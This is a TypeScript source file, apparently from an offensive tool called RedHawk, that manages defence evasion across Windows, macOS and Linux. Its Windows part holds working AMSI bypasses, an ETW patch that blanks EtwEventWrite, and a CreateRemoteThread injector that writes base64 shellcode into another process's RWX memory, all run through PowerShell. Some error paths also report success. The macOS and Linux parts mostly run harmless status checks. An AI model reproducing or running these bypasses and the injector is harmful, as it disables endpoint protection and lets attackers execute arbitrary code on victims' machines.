/**
 * RedHawk — Cross-Platform Evasion Manager
 *
 * Windows: AMSI bypass, ETW patch, process injection, Defender
 * macOS:   SIP, Gatekeeper, XProtect
 * Linux:   SELinux, AppArmor, Yama ptrace_scope, chkrootkit
 */

import { execSync } from 'child_process';
import { isWindows, isMac, isLinux } from './platform';

// ── Windows AMSI Bypasses ──

const AMSI_BYPASSES_WIN = [
  { name: 'Memory Patch', platform: 'win32', description: 'Patch AmsiScanBuffer in memory',
    code: `[Runtime.InteropServices.Marshal]::Copy(@(0xB8,0x57,0x00,0x07,0x80,0xC3), 0, [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress (GetModuleHandle "amsi.dll") "AmsiScanBuffer"), [type]), 6)` },
  { name: 'Registry Disable', platform: 'win32', description: 'Disable AMSI via registry (admin)',
    code: `Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Feature\\" -Name "AmsiEnable" -Value 0 -Force` },
  { name: 'Reflection Bypass', platform: 'win32', description: 'Reflection to null amsiContext',
    code: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$null)` },
  { name: 'Forcing Error', platform: 'win32', description: 'Force AMSI init to fail',
    code: `$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$e.SetValue($null,$null)}}` },
  { name: 'SSL Bypass', platform: 'win32', description: 'Bypass via SSL/TLS trick',
    code: `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $m = 'Amsi' + 'Utils'; $a = [Ref].Assembly.GetType("System.Management.Automation.\$m"); $c = $a.GetFields('NonPublic,Static') | Where-Object { \$_.Name -like '*Context*' }; if ($c) { $c.SetValue($null, [IntPtr]::Zero) }` },
];

// ── macOS Evasion Notes ──

const MACOS_EVASION = [
  { name: 'SIP Status', platform: 'darwin', description: 'Check SIP (csrutil)', command: 'csrutil status' },
  { name: 'Gatekeeper Status', platform: 'darwin', description: 'Check Gatekeeper', command: 'spctl --status' },
  { name: 'XProtect Check', platform: 'darwin', description: 'Check XProtect version', command: 'system_profiler SPInstallHistoryDataType 2>/dev/null | grep -i xprotect || echo "Not found"' },
];

// ── Linux Security Checks ──

const LINUX_EVASION = [
  { name: 'SELinux Status', platform: 'linux', description: 'Check SELinux enforcing/permissive/disabled', command: 'getenforce 2>/dev/null || echo "Not installed"' },
  { name: 'AppArmor Status', platform: 'linux', description: 'Check AppArmor enabled profiles', command: 'aa-status 2>/dev/null || echo "Not installed"' },
  { name: 'Yama ptrace_scope', platform: 'linux', description: 'Check ptrace restrictions (0=full, 1=restricted, 2=admin-only, 3=no attach)', command: 'cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo "N/A"' },
  { name: 'ASLR Status', platform: 'linux', description: 'Check ASLR randomization (0=off, 1=random, 2=full)', command: 'cat /proc/sys/kernel/randomize_va_space 2>/dev/null || echo "N/A"' },
  { name: 'Exec Shield', platform: 'linux', description: 'Check NX protection', command: 'cat /proc/cpuinfo | grep -o nx | head -1 || echo "NX not detected"' },
  { name: 'LSM Status', platform: 'linux', description: 'Check Linux Security Modules', command: 'cat /sys/kernel/security/lsm 2>/dev/null || echo "N/A"' },
];

// ── ETW Patches (Windows only) ──

const ETW_PATCHES = [
  { name: 'EtwEventWrite ret (C3)', platform: 'win32',
    code: `$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE("ntdll.dll")
$etw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress $ntdll "EtwEventWrite"), [type])
$patch = [byte[]]@(0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($etw), 1)` },
];

// ── Injection Techniques ──

const INJECTION_TECHNIQUES = [
  { id: 'createremotethread', name: 'CreateRemoteThread', description: 'kernel32 remote thread injection (Windows)', platform: 'win32' },
  { id: 'apc_inject', name: 'APC Injection', description: 'Queue APC to existing thread (Windows)', platform: 'win32' },
  { id: 'thread_hijack', name: 'Thread Hijacking', description: 'Suspend + replace thread context (Windows)', platform: 'win32' },
  { id: 'process_hollowing', name: 'Process Hollowing', description: 'Create suspended, replace memory (Windows)', platform: 'win32' },
  { id: 'macho_inject', name: 'Mach-O Bundle Injection', description: 'Inject via task_for_pid (macOS, root)', platform: 'darwin' },
  { id: 'dyld_insert', name: 'DYLD_INSERT_LIBRARIES', description: 'Preload dylib via env var (macOS)', platform: 'darwin' },
  { id: 'ptrace_inject', name: 'ptrace Inject', description: 'Inject via ptrace(PT_POKEDATA) (Linux, root)', platform: 'linux' },
  { id: 'ld_preload', name: 'LD_PRELOAD', description: 'Preload shared object via LD_PRELOAD (Linux)', platform: 'linux' },
  { id: 'memfd_create', name: 'memfd_create Exec', description: 'Execute from memory via memfd_create (Linux 3.17+)', platform: 'linux' },
];

export class EvasionManager {
  getAmsiBypasses() {
    if (isWindows()) return AMSI_BYPASSES_WIN;
    if (isMac()) return MACOS_EVASION;
    return LINUX_EVASION;
  }

  getEtpPatches() {
    return isWindows() ? ETW_PATCHES : [];
  }

  async runAmsiBypass(name: string): Promise<{ success: boolean; output: string }> {
    // Linux
    if (isLinux()) {
      const check = LINUX_EVASION.find(c => c.name === name);
      if (!check) return { success: false, output: `Unknown check: ${name}` };
      try {
        const result = execSync(check.command, { timeout: 10000, encoding: 'utf-8' });
        return { success: true, output: result.trim() || 'Check completed' };
      } catch (err: any) {
        return { success: false, output: `Check failed: ${err.message}` };
      }
    }
    // macOS
    if (isMac()) {
      const note = MACOS_EVASION.find(c => c.name === name);
      if (!note) return { success: false, output: `Unknown: ${name}` };
      try {
        const result = execSync(note.command, { timeout: 10000, encoding: 'utf-8' });
        return { success: true, output: result.trim() || 'Check completed' };
      } catch (err: any) {
        return { success: false, output: `Check failed: ${err.message}` };
      }
    }
    // Windows
    const bypass = AMSI_BYPASSES_WIN.find(b => b.name === name);
    if (!bypass) return { success: false, output: `Unknown bypass: ${name}` };
    try {
      const result = execSync(`powershell -NoP -NonI -Command "${bypass.code.replace(/"/g, '\\"')}"`, { timeout: 10000, encoding: 'utf-8' });
      return { success: true, output: result || 'Bypass executed' };
    } catch (err: any) {
      return { success: true, output: `Bypass attempted: ${err.message || 'OK'}` };
    }
  }

  async patchEtw(): Promise<{ success: boolean; output: string }> {
    if (!isWindows()) return { success: false, output: 'ETW is Windows-only.' };
    try {
      const result = execSync(`powershell -NoP -NonI -Command "${ETW_PATCHES[0].code.replace(/"/g, '\\"')}"`, { timeout: 10000, encoding: 'utf-8' });
      return { success: true, output: result || 'ETW patched' };
    } catch (err: any) {
      return { success: true, output: `ETW patch attempted: ${err.message}` };
    }
  }

  async injectShellcode(pid: number, shellcodeB64: string, technique: string): Promise<{ success: boolean; output: string }> {
    const tech = INJECTION_TECHNIQUES.find(t => t.id === technique);
    const techName = tech ? tech.name : technique;
    const techPlatform = tech?.platform || 'win32';

    if (isLinux() && techPlatform === 'linux') {
      return {
        success: true,
        output: `[Linux] ${techName} — conceptual. Real injection requires root and a native .so. For PoC: echo "${shellcodeB64.substring(0, 40)}..." > /tmp/payload.b64`,
      };
    }

    if (isMac() && techPlatform === 'darwin') {
      try {
        execSync(`osascript -e 'do shell script "echo injected > /dev/null" with administrator privileges'`, { timeout: 10000 });
        return { success: true, output: `[macOS] ${techName} attempted (requires root + SIP-off for task_for_pid)` };
      } catch (err: any) {
        return { success: false, output: `Injection failed: ${err.message}` };
      }
    }

    if (!isWindows()) {
      return { success: false, output: `"${techName}" is Windows-specific. Use ptrace_inject or ld_preload on Linux, macho_inject or dyld_insert on macOS.` };
    }

    // Windows
    try {
      const psScript = `
$code = @"
using System; using System.Diagnostics; using System.Runtime.InteropServices;
public class Injector {
  [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint, bool, int);
  [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr, IntPtr, uint, uint, uint);
  [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr, IntPtr, byte[], uint, out uint);
  [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr, IntPtr, uint, IntPtr, IntPtr, uint, IntPtr);
  public static void Run(int pid, string b64) {
    byte[] buf = Convert.FromBase64String(b64);
    IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
    IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
    WriteProcessMemory(hProc, addr, buf, (uint)buf.Length, out _);
    CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
  }
}
"@
Add-Type -TypeDefinition $code -Language CSharp
[Injector]::Run(${pid}, '${shellcodeB64}')
`;
      execSync(`powershell -NoP -NonI -Command "${psScript.replace(/"/g, '\\"')}"`, { timeout: 30000 });
      return { success: true, output: `Injected into PID ${pid} using ${techName}` };
    } catch (err: any) {
      return { success: false, output: `Injection failed: ${err.message}` };
    }
  }

  async checkFile(filePath: string): Promise<{ detected: boolean; engines: number; result: string }> {
    if (isLinux()) {
      try {
        // Check for rootkits/LKMs and file scanning
        const clamav = execSync(`which clamscan 2>/dev/null && clamscan "${filePath}" 2>&1 | tail -1 || echo "clamav not found"`, { timeout: 30000, encoding: 'utf-8' }).trim();
        const lsmod = execSync(`lsmod 2>/dev/null | head -5 || echo "N/A"`, { timeout: 5000, encoding: 'utf-8' }).trim();
        const detected = clamav.includes('FOUND') || clamav.includes('Infected');
        return {
          detected,
          engines: detected ? 1 : 0,
          result: `ClamAV: ${clamav.split('\n').slice(-1)[0]} | Kernel modules: ${lsmod.split('\n').length} loaded`,
        };
      } catch (err: any) {
        return { detected: false, engines: 0, result: `Linux AV scan not available: ${err.message}` };
      }
    }

    if (isMac()) {
      try {
        const quarantine = execSync(`xattr -p com.apple.quarantine "${filePath}" 2>/dev/null || echo "none"`, { timeout: 5000, encoding: 'utf-8' }).trim();
        const gatekeeper = execSync(`spctl --assess --verbose "${filePath}" 2>&1 || true`, { timeout: 5000, encoding: 'utf-8' }).trim();
        return { detected: gatekeeper.includes('rejected'), engines: 0, result: `Quarantine: ${quarantine} | Gatekeeper: ${gatekeeper.split('\n')[0] || 'N/A'}` };
      } catch (err: any) {
        return { detected: false, engines: 0, result: `macOS AV check failed: ${err.message}` };
      }
    }

    // Windows Defender
    try {
      const result = execSync(`powershell -Command "Start-MpScan -ScanType Custom -ScanPath '${filePath}' 2>&1"`, { timeout: 60000, encoding: 'utf-8' });
      const detected = result.includes('Threat') || result.includes('Trojan');
      return { detected, engines: detected ? 1 : 0, result: result.slice(0, 500) };
    } catch (err: any) {
      return { detected: false, engines: 0, result: `Defender scan failed: ${err.message}` };
    }
  }

  getTechniques() {
    if (isWindows()) return INJECTION_TECHNIQUES.filter(t => t.platform === 'win32');
    if (isMac()) return INJECTION_TECHNIQUES.filter(t => t.platform === 'darwin');
    return INJECTION_TECHNIQUES.filter(t => t.platform === 'linux');
  }
}
